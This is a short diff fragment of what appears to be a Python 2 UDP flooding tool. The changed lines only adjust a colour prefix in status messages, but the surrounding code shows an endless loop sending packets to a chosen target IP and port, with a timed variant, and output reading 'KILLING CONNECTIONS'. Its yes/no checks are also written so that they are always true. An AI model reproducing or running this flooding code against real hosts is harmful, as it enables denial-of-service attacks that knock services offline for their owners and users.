@@ -56,7 +56,7 @@ if yn == "y" or "yes" or "YES" or "Y" :
 		while True:
 			sock.sendto(packets, (ip, port))
 			sent = sent + 1
-			print "KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
+			print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
 
 	if time == "y" or "yes" or "YES" or "Y" :
 		duration = input()
@@ -73,4 +73,4 @@ if yn == "y" or "yes" or "YES" or "Y" :
 				pass
 			sock.sendto(packets, (ip, port))
 			sent = sent + 1
-			print +N"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
+			print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
